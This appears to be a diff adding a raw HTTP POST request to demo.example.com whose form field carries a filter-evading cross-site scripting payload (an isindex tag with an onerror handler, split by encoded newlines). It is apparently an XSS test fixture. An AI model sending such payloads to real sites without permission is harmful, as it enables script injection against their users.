@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+Connection: close
+
+data=<isindex%0atype=image%0asrc=1%0aonerror=alert(1)>
